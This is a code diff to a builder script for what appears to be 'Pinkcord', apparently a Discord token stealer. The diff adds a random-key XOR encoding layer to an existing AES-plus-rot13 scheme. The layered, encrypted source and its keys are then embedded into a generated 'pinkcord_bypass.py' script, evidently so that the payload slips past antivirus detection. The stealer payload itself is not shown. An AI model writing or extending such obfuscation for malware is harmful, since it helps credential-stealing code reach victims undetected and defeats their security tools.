@@ -6,6 +6,7 @@ import platform
 import os
 import string
 import secrets
+import random
 
 TOKEN_FILE = 'template/pinkcord.py'
 TO_BYPASS_FILE = 'to_bypass.txt'
@@ -97,6 +98,11 @@ if answer == "1":
         cipher = AES.new(key, AES.MODE_CBC)
         ciphertext = cipher.encrypt(pad(text.encode(), AES.block_size))
         return base64.b64encode(cipher.iv + ciphertext).decode()
+    def text_to_xor(text, key):
+        xor_result = []
+        for char in text:
+            xor_result.append(ord(char) ^ key)
+        return xor_result
     print(YELLOW_COLOR + 'Encoding Pinkcord...' + COLOR_RESET)
     with open("pinkcord.py", 'r') as sourcecode:
        sourcecode = sourcecode.read()
@@ -112,8 +118,12 @@ if answer == "1":
        key = PBKDF2(password.encode(), salt, dkLen=32, count=1000000)
        sourcecode = encrypt_code_AES(sourcecode, key)
        sourcecode = codecs.decode(sourcecode, 'rot13')
+       xorkey = random.randint(0, 255)
+       sourcecode = str(text_to_xor(sourcecode, xorkey))
        with open("AES_KEY.txt", "wb") as f:
             f.write(base64.b64encode(key))
+       with open("XOR_KEY.txt", "w") as f:
+            f.write(str(xorkey))
     print(GREEN_COLOR + "[*] encoded" + COLOR_RESET)
     print(YELLOW_COLOR + "Creating a bypass script..." + COLOR_RESET)
     with open(BYPASS_FILE, 'r') as bypass:
@@ -121,6 +131,8 @@ if answer == "1":
         content = content.replace("<BYPASS>", sourcecode)
         with open(AES_KEY_FILE, 'r') as key:
             content = content.replace("<BYPASS_KEY>", key.read())
+            with open("XOR_KEY.txt", "r") as xorkey:
+                content = content.replace("<XORKEY>", xorkey.read())
 
     with open("pinkcord_bypass.py", 'w') as bypass:
         bypass.write(content)
